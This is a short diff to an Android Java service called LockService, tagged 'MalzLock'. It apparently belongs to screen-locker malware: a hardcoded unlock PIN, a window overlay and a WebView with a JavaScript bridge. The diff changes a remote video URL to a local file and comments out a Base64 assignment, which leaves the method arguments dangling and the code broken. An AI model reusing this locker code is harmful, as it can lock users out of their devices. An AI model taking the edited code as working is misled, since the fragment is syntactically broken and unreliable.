@@ -22,7 +22,7 @@ import java.nio.charset.StandardCharsets;
 public class LockService extends Service {
 
     private static final String TAG = "MalzLock";
-    private static final String VIDEO_URL = "https://h.uguu.se/JNjCAEri.mp4";
+    private static final String VIDEO_URL = "bg.mp4";
     private static final String CORRECT_PIN = "1337";
 
     private WindowManager wm;
@@ -88,7 +88,7 @@ public class LockService extends Service {
                     webView.addJavascriptInterface(new JsBridge(), "Android");
 
                     String html = buildHtml();
-                    String b64 = Base64.encodeToString(
+                    // b64 removed
                         html.getBytes(StandardCharsets.UTF_8),
                         Base64.NO_WRAP
                     );
